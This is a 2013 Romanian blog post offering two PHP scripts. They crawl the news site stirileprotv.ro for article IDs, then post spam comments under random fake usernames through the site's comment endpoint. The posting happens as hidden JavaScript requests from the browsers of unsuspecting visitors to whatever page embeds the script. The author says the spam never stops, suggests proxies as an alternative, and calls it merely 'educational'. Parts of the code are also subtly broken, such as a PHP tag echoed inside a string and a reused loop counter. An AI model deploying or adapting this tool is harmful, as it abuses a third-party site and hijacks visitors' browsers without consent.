---
id: 97
title: 'StrileProTV.ro – comment spammer [PHP]'
date: 2013-02-05T22:31:24+00:00
author: Silviu Stroe
layout: post
guid: http://silviu-s.com/?p=97
permalink: /strileprotv-ro-comment-spammer-php/
dpsp_networks_shares:
  - 'a:0:{}'
categories:
  - Programming
tags:
  - comment
  - php
  - script
  - spammer
  - stirileprotv.ro
---
Am scris in PHP (cu picioarele) un mic script care preia articolele de pe un numar prestabilit (de utilizator) de pagini de pe site-ul de stiri mentionat si posteaza comentarii la ce vreti voi (le setati din script, bineinteles).
  
Scriptul ar trebui inclus in index sau pe o pagina cu multe vizite ale unui site de-al vostru, pentru ca am ales sa folosesc JavaScript pentru a “posta” comentariile, dar puteti modifica si in loc de javascript sa folositi cURL si proxy-uri.
  
Crawler.php

<pre class="brush: php; title: ; notranslate" title=""><?php 
 // Original PHP code by Chirp Internet: www.chirp.com.au 
  // Please acknowledge use of this code by including this header. 
  for($i=1;$i<=500;$i++) //$i-ul merge pana la cate pagini doriti sa faceti crawling.
  { 
  $url = "http://m.stirileprotv.ro/lbin/mobile/index.php?section_id=1&page=$i"; 
  $input = get_data($url) or die("Could not access file: $url"); 
  $regexp = "<a\s[^>]*href=(\"??)([^\" >]*?)\\1[^>]*>(.*)<\/a>"; 
  if(preg_match_all("/$regexp/siU", $input, $matches)) { 
      $link = $matches[2]; 
      for($i=1;$i<=28;$i++)  
      if (strlen(strstr($link[$i],'article_id='))>0) {  
$ok = str_replace('index.php?article_id=','',$link[$i]);  
$file = 'articole.txt'; 
$current = file_get_contents($file); 
$current .= "$ok\n"; 
file_put_contents($file, $current); 
} 
} 
} 
function get_data($url) 
{ 
$ch = curl_init(); 
$timeout = 5; 
curl_setopt($ch,CURLOPT_URL,$url); 
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
$data = curl_exec($ch); 
curl_close($ch); 
return $data; 
} 
?>
</pre>

Poster.php

<pre class="brush: php; title: ; notranslate" title=""><?php 
ERROR_REPORTING(0); 

if ( ($fh = fopen('articole.txt', 'r')) !== false) 
{ 
   $nrart = implode(" ", (fgetcsv($fh, 1000, " ")) ); 
} 
fclose($fh); 
$num = array('mihai','gabi','andrei','ana','alex','daiana','alberto','iulian','gabi','stefan','monica','george'); 
$rand=rand(0,11); 
$random=rand(10,301); 
$numek=$num[$rand]; 
$mesaj=array('test1','comm2','comentariu 3','comentariu 4'); 
$rndmsg=rand(0,3); 
$postare=$mesaj[$rndmsg]; 
$postare=str_replace(' ','%20',$postare); 
$linke = "http://stirileprotv.ro/lbin/ajax/comment_save.php?username=$numek$random&article_id=$nrart&txt=$postare"; 
$f = 'articole.txt'; 
function read_and_delete_first_line($filename) { 
  $file = file($filename); 
  $output = $file[0]; 
  unset($file[0]); 
  file_put_contents($filename, $file); 
  return $output; 
} 
read_and_delete_first_line($f); 
$lines = file($f);  
$count = count($lines); 
if ($count<10) 
{ 
echo '<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"> 
</script> 
<script> 
$(document).ready(function(){ 
  $(window).load(function(){ 
    $.get("http://adresa_site/crawler.php");});}); 
</script>'; 
}else{ 
echo '<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"> 
</script> 
<script> 
$(document).ready(function(){ 
  $(window).load(function(){ 
    $.get("<?php echo $linke; ?>");});}); 
</script>'; 
} 
?>
</pre>

Spam-ul nu se va opri niciodata, deoarece am setat ca atunci cand sunt mai putin de 10 articole de spamat, sa se faca un request catre scriptul care face crawling.
  
Trebuie sa mai creati un fisier, articole.txt, iar la toate 3 fisierele sa setati chmod 777.

Acesta este doar un articol educational, nu sunt raspunzator pentru ce faceti voi cu acest script.
  
Enjoy! 😀
